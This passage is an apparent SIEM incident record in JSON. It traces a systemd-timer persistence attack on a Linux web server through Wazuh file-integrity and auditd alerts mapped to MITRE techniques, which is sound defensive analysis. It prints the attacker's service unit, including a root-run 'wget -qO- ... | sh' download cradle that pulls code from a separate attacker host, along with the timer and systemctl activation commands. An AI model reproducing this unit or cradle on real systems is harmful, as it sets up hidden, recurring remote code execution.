{
  "severity": "critical",
  "host_observations": [
    {"host": "ubuntu-web-app-10", "ip": "10.108.57.10", "role": "linux_web_app_server_systemd_timer_dropped", "first_seen": "2027-12-03T16:22:08+0100", "last_seen": "2027-12-03T16:37:42+0100"},
    {"ip": "10.108.57.184", "inferred_role": "internal_attacker_payload_host", "first_seen": "2027-12-03T16:22:08+0100", "last_seen": "2027-12-03T16:37:42+0100"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Scheduled Task — systemd Timer Drop", "technique": "T1053.006", "what_happened": "At 2027-12-03 16:22:08 CET, Wazuh FIM on ubuntu-web-app-10 (agent.id=110) reported syscheck.event='added' on TWO files in /etc/systemd/system/: syscheck.path='/etc/systemd/system/net-sync.timer' AND syscheck.path='/etc/systemd/system/net-sync.service'. Both files were owned by root, mode 644, NOT dpkg-tracked, NOT in the corp config-management inventory. The timer unit is configured with OnBootSec=2min + OnUnitActiveSec=15min (= reactivate every 15 minutes after boot) and WantedBy=timers.target.", "chain_reason": "Wazuh FIM rule 553 'File added to the system' + custom rule 80710 'Systemd unit created outside package management' fired with rule.mitre.id=T1053.006. The 15-minute reactivation interval is unusually short for any legitimate corp timer (the corp baseline is daily / weekly timers).", "first_seen": "2027-12-03T16:22:08+0100"},
    {"step": 2, "tactic": "Persistence / ExecStart Inline Shell with Download Cradle", "technique": "T1053.006", "what_happened": "FIM also captured the service unit's content via syscheck.diff: ExecStart=/bin/bash -c 'wget -qO- http://10.108.57.184/u | sh' + User=root + Type=oneshot. This is the textbook download-cradle pattern: every 15 minutes, the timer fires the service, which runs bash that wget-pipes a remote script directly into sh — fetching and executing whatever the attacker host serves at /u at that moment. The corp-approved systemd-unit policy requires (a) ExecStart pointing to a packaged binary, (b) no inline shell with download cradles, (c) no User=root for non-system services — this unit violates ALL three.", "chain_reason": "Wazuh custom rule 80711 'Systemd service ExecStart contains wget|sh / curl|sh pattern' fired with rule.mitre.id=[T1053.006,T1105]. The combined signal (rule 553 FIM + rule 80710 systemd-unit-created + rule 80711 inline-shell-download-cradle) is high-fidelity for malicious timer persistence.", "first_seen": "2027-12-03T16:22:08+0100"},
    {"step": 3, "tactic": "Execution / systemctl daemon-reload + enable Within 60 seconds", "technique": "T1053.006", "what_happened": "At 16:22:34 CET (26 seconds after the FIM events), auditd captured: data.audit.exe='/bin/systemctl', data.audit.command='systemctl daemon-reload', data.audit.uid=0, ppid=21744 (parent bash). Followed immediately at 16:22:41 by data.audit.command='systemctl enable --now net-sync.timer', also uid=0. The 'daemon-reload + enable' pair within 60s of unit creation is the activation fingerprint — the attacker registered the unit AND immediately enabled+started it. Without this, the unit would only fire on next reboot.", "chain_reason": "Wazuh custom rule 80712 'systemctl daemon-reload + enable on user-managed unit within 60s of FIM add' fired with rule.mitre.id=T1053.006. The 26-second + 33-second timing relative to step-1 FIM events is the scripted-operator chain.", "first_seen": "2027-12-03T16:22:34+0100"},
    {"step": 4, "tactic": "Command and Control — Timer Fires Outbound Download Cradle", "technique": "T1071.001", "what_happened": "At 16:24:08 CET (~2 min after enable, matching OnBootSec=2min), auditd captured the FIRST timer fire: data.audit.exe='/usr/bin/wget', data.audit.command='wget -qO- http://10.108.57.184/u', data.audit.uid=0, parent traces to /bin/bash spawned by systemd's net-sync.service unit. Within the same audit session, /bin/sh was invoked (the |sh pipe stage). Suricata logged outbound HTTP from data.srcip=10.108.57.10 to data.dstip=10.108.57.184 dstport=80, signature='Outbound HTTP from systemd-spawned shell to non-corp internal IP'. The second timer fire would be at 16:24+15 = 16:39 — but the alert window closes at 16:37:42 before that, so only one fire is captured in this incident.", "chain_reason": "Wazuh custom rule 80713 'wget|sh / curl|sh executed by systemd-spawned bash' fired with rule.mitre.id=[T1071.001,T1105]. The audit session lineage (systemd → net-sync.service → bash → wget) is the literal proof the dropper timer is now active and beaconing.", "first_seen": "2027-12-03T16:24:08+0100"}
  ],
  "time_window": {"start": "2027-12-03T16:22:08+0100", "end": "2027-12-03T16:37:42+0100"},
